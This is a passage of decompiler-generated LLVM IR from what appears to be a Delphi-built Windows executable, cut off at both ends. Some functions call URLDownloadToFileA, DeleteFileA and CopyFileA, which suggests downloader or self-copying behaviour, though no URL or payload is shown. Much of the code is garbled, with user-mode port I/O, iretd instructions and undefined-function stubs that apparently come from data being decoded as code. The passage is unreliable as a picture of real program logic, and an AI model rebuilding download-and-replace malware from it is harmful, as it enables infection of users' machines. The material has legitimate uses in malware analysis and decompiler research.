  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1110
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1111
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1111
  %46 = icmp eq i1 %45, false, !insn.addr !1112
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1113
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1113

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1114
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1114
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1115
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1115
  br label %dec_label_pc_405c7a, !insn.addr !1115

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1116
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1116
  %51 = load i32, i32* %50, align 4, !insn.addr !1116
  ret i32 %51, !insn.addr !1117
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1118
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1118
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1118
  store i8 %6, i8* %7, align 1, !insn.addr !1118
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1119
  %10 = udiv i32 %4, 256, !insn.addr !1119
  %11 = trunc i32 %10 to i8, !insn.addr !1119
  %12 = add i8 %9, %11, !insn.addr !1119
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1119
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1119
  store i8 %12, i8* %14, align 1, !insn.addr !1119
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1120
  %17 = add i32 %4, 6, !insn.addr !1120
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1120
  %19 = zext i1 %16 to i32, !insn.addr !1120
  %20 = and i32 %4, -65536, !insn.addr !1120
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1121
  %23 = or i1 %16, %22, !insn.addr !1121
  %24 = add i32 %18, 6, !insn.addr !1121
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1121
  %26 = zext i1 %23 to i32, !insn.addr !1121
  %27 = and i32 %25, 15, !insn.addr !1121
  %28 = or i32 %27, %20, !insn.addr !1121
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1121
  %31 = or i32 %28, %30, !insn.addr !1121
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1122
  %33 = load i8, i8* %32, align 1, !insn.addr !1122
  %34 = trunc i32 %27 to i8, !insn.addr !1122
  %35 = xor i8 %33, %34, !insn.addr !1122
  store i8 %35, i8* %32, align 1, !insn.addr !1122
  %36 = add i32 %0, 1311123697, !insn.addr !1123
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1123
  %38 = load i8, i8* %37, align 1, !insn.addr !1123
  %39 = udiv i32 %3, 256, !insn.addr !1123
  %40 = trunc i32 %39 to i8, !insn.addr !1123
  %41 = add i8 %38, %40, !insn.addr !1123
  store i8 %41, i8* %37, align 1, !insn.addr !1123
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1124
  %43 = load i32, i32* %42, align 4, !insn.addr !1124
  %44 = sub i32 %43, %31, !insn.addr !1124
  store i32 %44, i32* %42, align 4, !insn.addr !1124
  %45 = add i32 %3, 117, !insn.addr !1125
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1125
  %47 = load i8, i8* %46, align 1, !insn.addr !1125
  %48 = add i8 %47, %34, !insn.addr !1125
  %49 = icmp eq i8 %48, 0, !insn.addr !1125
  store i8 %48, i8* %46, align 1, !insn.addr !1125
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1126

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1127
  %51 = trunc i32 %3 to i16, !insn.addr !1128
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1128
  %53 = load i32, i32* %52, align 4, !insn.addr !1128
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1128
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1129
  %55 = load i8, i8* %54, align 1, !insn.addr !1129
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1129
  %56 = load i8, i8* %32, align 1, !insn.addr !1130
  %57 = add i8 %56, %34, !insn.addr !1130
  store i8 %57, i8* %32, align 1, !insn.addr !1130
  %58 = call i32 @__asm_iretd(), !insn.addr !1131
  %59 = add i32 %2, -117, !insn.addr !1132
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1132
  %61 = load i8, i8* %60, align 1, !insn.addr !1132
  %62 = add i8 %61, -69, !insn.addr !1132
  store i8 %62, i8* %60, align 1, !insn.addr !1132
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1133
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1134
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1134
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1134
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1135
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1136
  %67 = add i32 %66, 1, !insn.addr !1136
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1136
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1137
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1138
  ret i32 0, !insn.addr !1139

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1140
  store i32 %69, i32* %ebx, align 4, !insn.addr !1141
  %70 = icmp slt i32 %69, 0, !insn.addr !1142
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1143

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1144
  store i32 %71, i32* %ebx, align 4, !insn.addr !1144
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1145
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1146
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1147
  %75 = call i32 @function_403c90(), !insn.addr !1148
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1149
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1150
  br label %dec_label_pc_405d79, !insn.addr !1150

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1151
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1152
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1152
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1152
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1153
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1154
  %3 = add i32 %2, 1, !insn.addr !1154
  %4 = icmp eq i32 %3, 0, !insn.addr !1154
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1154
  %5 = icmp eq i1 %4, false, !insn.addr !1155
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1155

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1156
  br label %dec_label_pc_405da9, !insn.addr !1156

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1157
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1158
  ret i32 0, !insn.addr !1159
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1160
  ret i32 %0, !insn.addr !1160
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1161
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1162
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1163
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1163
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1163
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1164
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1165
  %3 = add i32 %2, -1, !insn.addr !1165
  %4 = icmp eq i32 %2, 0, !insn.addr !1165
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1165
  %5 = icmp eq i1 %4, false, !insn.addr !1166
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1166

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1167
  br label %dec_label_pc_405df4, !insn.addr !1168

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1169
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1170
  ret i32 0, !insn.addr !1171
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1172
  ret i32 %0, !insn.addr !1172
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1173
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1174
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1175
  %.reg2mem = alloca i8, !insn.addr !1175
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1175
  %5 = trunc i32 %2 to i8, !insn.addr !1176
  %6 = and i8 %5, 31, !insn.addr !1176
  %7 = icmp eq i8 %6, 0, !insn.addr !1176
  br i1 %7, label %dec_label_pc_405e0c._crit_edge, label %9, !insn.addr !1176

dec_label_pc_405e0c._crit_edge:                   ; preds = %dec_label_pc_405e0c
  %8 = trunc i32 %0 to i8
  store i8 %8, i8* %.reg2mem
  br label %14

; <label>:9:                                      ; preds = %dec_label_pc_405e0c
  %10 = add i32 %1, -959064636, !insn.addr !1176
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1176
  %12 = load i8, i8* %11, align 1, !insn.addr !1176
  %13 = shl i8 %12, %6, !insn.addr !1176
  store i8 %13, i8* %11, align 1, !insn.addr !1176
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  store i8 %.pre, i8* %.reg2mem, !insn.addr !1176
  br label %14, !insn.addr !1176

; <label>:14:                                     ; preds = %dec_label_pc_405e0c._crit_edge, %9
  %.reload = load i8, i8* %.reg2mem, !insn.addr !1177
  %15 = zext i8 %.reload to i32, !insn.addr !1177
  %16 = and i32 %3, -256, !insn.addr !1177
  %17 = or i32 %16, %15, !insn.addr !1177
  %18 = inttoptr i32 %17 to i8*, !insn.addr !1178
  %19 = load i8, i8* %18, align 1, !insn.addr !1178
  %factor = mul i8 %.reload, 30
  %20 = add i8 %factor, %19, !insn.addr !1179
  store i8 %20, i8* %18, align 1, !insn.addr !1179
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1180
  store i32 %arg1, i32* %esi, align 4, !insn.addr !1181
  %21 = call i32 @__readfsdword(i32 0), !insn.addr !1182
  store i32 %21, i32* %stack_var_-48, align 4, !insn.addr !1182
  %22 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1182
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !1183
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1184
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1184
  %24 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1185
  %25 = icmp eq i32 %24, 32770, !insn.addr !1186
  %26 = icmp eq i1 %25, false, !insn.addr !1187
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1187
  br i1 %26, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1187

dec_label_pc_405e88:                              ; preds = %14
  %27 = call i32 @function_407020(), !insn.addr !1188
  %28 = call i32 @"@LStrPos"(), !insn.addr !1189
  %29 = call i32 @"@LStrPos"(), !insn.addr !1190
  %30 = add i32 %29, -1, !insn.addr !1191
  %31 = icmp slt i32 %30, 0, !insn.addr !1192
  %32 = add i32 %28, 2, !insn.addr !1193
  %33 = icmp sgt i32 %32, %30, !insn.addr !1194
  %or.cond = or i1 %31, %33
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1195
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1195

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %34 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1196
  store i32 %34, i32* %stack_var_-60, align 4, !insn.addr !1196
  %35 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1196
  %36 = call i32 @"@LStrCopy"(), !insn.addr !1197
  %37 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1198
  %38 = icmp eq i32 %37, 0, !insn.addr !1198
  store i32 %35, i32* %esp.0.reg2mem, !insn.addr !1199
  br i1 %38, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1199

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %39 = call i32 @function_406e08(), !insn.addr !1200
  %40 = call i32 @"@LStrFromPChar"(), !insn.addr !1201
  %41 = call i32 @"@LStrCat"(), !insn.addr !1202
  %42 = call i32 @function_4036c8(), !insn.addr !1203
  %43 = inttoptr i32 %42 to i8*, !insn.addr !1204
  %44 = call i1 @DeleteFileA(i8* %43), !insn.addr !1205
  %45 = call i32 @function_4036c8(), !insn.addr !1206
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1207
  store i8* %46, i8** %stack_var_-76, align 4, !insn.addr !1207
  %47 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1207
  %48 = call i1 @CopyFileA(i8* %46, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1208
  %49 = call i32 @function_405b70(), !insn.addr !1209
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1209
  br label %dec_label_pc_405f34, !insn.addr !1209

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %14
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1210
  %51 = load i32, i32* %50, align 4, !insn.addr !1210
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1211
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1212
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1212
  store i32 4218710, i32* %53, align 4, !insn.addr !1212
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1213
  ret i32 %54, !insn.addr !1214
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1215
  ret i32 %0, !insn.addr !1215
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1216
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1217
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1217
  %3 = load i32, i32* %2, align 4, !insn.addr !1217
  ret i32 %3, !insn.addr !1218
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1219
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1219
  store i32 %1, i32* %2, align 4, !insn.addr !1219
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1220
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1220
  %7 = add i8 %4, %6, !insn.addr !1220
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1220
  store i8 %7, i8* %8, align 1, !insn.addr !1220
  %9 = load i32, i32* %eax, align 4, !insn.addr !1221
  ret i32 %9, !insn.addr !1221
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1222
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1222
  store i8 %4, i8* %5, align 1, !insn.addr !1222
  %6 = mul i32 %0, 4096, !insn.addr !1223
  %7 = udiv i32 %0, 1048576, !insn.addr !1223
  %8 = or i32 %7, %6, !insn.addr !1223
  %9 = and i32 %0, 1048576, !insn.addr !1223
  %10 = icmp eq i32 %9, 0, !insn.addr !1223
  %11 = load i32, i32* %edx, align 4, !insn.addr !1224
  %12 = trunc i32 %11 to i16, !insn.addr !1224
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1224
  %14 = sext i8 %13 to i32, !insn.addr !1224
  %15 = or i32 %2, %14, !insn.addr !1224
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1225
  %17 = and i32 %15, -256, !insn.addr !1225
  %18 = or i32 %17, %16, !insn.addr !1225
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1226
  %20 = load i8, i8* %19, align 1, !insn.addr !1226
  %21 = mul i8 %20, 2, !insn.addr !1226
  %22 = lshr i8 %20, 7, !insn.addr !1226
  %23 = or i8 %22, %21, !insn.addr !1226
  store i8 %23, i8* %19, align 1, !insn.addr !1226
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1227
  %26 = udiv i32 %1, 256, !insn.addr !1227
  %27 = trunc i32 %26 to i8, !insn.addr !1227
  %28 = add i8 %25, %27, !insn.addr !1227
  %29 = load i32, i32* %edx, align 4, !insn.addr !1227
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1227
  store i8 %28, i8* %30, align 1, !insn.addr !1227
  %31 = add i32 %8, -4, !insn.addr !1228
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1228
  store i32 4218448, i32* %32, align 4, !insn.addr !1228
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1229
  %34 = sext i1 %33 to i32, !insn.addr !1229
  ret i32 %34, !insn.addr !1230
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1231
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1231
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1231
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1232
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1233
  %3 = add i32 %2, 1, !insn.addr !1233
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1233
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1234
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1235
  ret i32 0, !insn.addr !1236
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1237
  ret i32 %0, !insn.addr !1237
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1238
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1239
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1240
  %2 = add i32 %1, -1, !insn.addr !1240
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1240
  ret i32 %0, !insn.addr !1241
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1242
  %0 = call i32 @function_40603c(), !insn.addr !1243
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1244
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1245
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1245

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1246
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1247
  %5 = load i32, i32* %4, align 4, !insn.addr !1247
  %6 = icmp eq i32 %5, 0, !insn.addr !1247
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1248
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1248

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1249
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1250
  unreachable, !insn.addr !1250

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1251
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1252
  %1 = icmp eq i32 %0, 0, !insn.addr !1252
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1253

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1254
  br label %dec_label_pc_40601a, !insn.addr !1254

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1255
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1256
  %5 = load i32, i32* %4, align 4, !insn.addr !1256
  %6 = mul i32 %5, 1000, !insn.addr !1256
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1257
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1258
  ret i32 %7, !insn.addr !1259
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1260
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1260
  %1 = icmp eq i32 %0, 0, !insn.addr !1260
  store i32 %0, i32* %.reg2mem, !insn.addr !1261
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1261

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1261
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1261
  br label %dec_label_pc_406045, !insn.addr !1261

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1262
  ret i32 %.reload, !insn.addr !1263
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1264
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1265
  ret i32 %1, !insn.addr !1266
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1267
  %1 = icmp eq i32 %0, 0, !insn.addr !1267
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1268

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1269
  br label %dec_label_pc_406076, !insn.addr !1269

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1270
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1271
  ret i32 %3, !insn.addr !1272
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1273
  ret i32 %0, !insn.addr !1274
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1275
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1275
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1275
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1276
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1277
  %3 = add i32 %2, 1, !insn.addr !1277
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1277
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1278
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1279
  ret i32 0, !insn.addr !1280
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1281
  ret i32 %0, !insn.addr !1281
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1282
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1283
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1284
  %2 = add i32 %1, -1, !insn.addr !1284
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1284
  ret i32 %0, !insn.addr !1285
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1286
  ret i32 %0, !insn.addr !1286
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1287
  %ebx.0.reg2mem = alloca i32, !insn.addr !1287
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1288
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1289
